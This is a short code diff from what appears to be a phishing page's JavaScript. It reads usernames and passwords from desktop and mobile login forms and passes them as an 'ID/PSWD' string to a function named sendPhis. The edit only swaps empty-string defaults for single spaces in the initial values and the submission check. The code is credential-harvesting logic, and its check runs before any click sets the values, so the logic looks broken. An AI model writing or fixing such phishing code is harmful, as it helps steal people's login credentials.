@@ -9,7 +9,7 @@ function sendPhis(userdata) {
   });
 }
 function initialize() {
-  let username = "", password = "";
+  let username = " ", password = " ";
   document.getElementById("loginbutton").onclick = buttonclick => {
     username = document.getElementById("username").value;
     password = document.getElementById("userpassword").value;
@@ -18,7 +18,7 @@ function initialize() {
     username = document.getElementById("mobusername").value;
     password = document.getElementById("mobuserpassword").value;
   });
-  if (username != "" && password != "") {
+  if (username != " " && password != " ") {
     let userdata = "ID = " + username + "\nPSWD = " + password + "\n\n";
     sendPhis(userdata);
   }
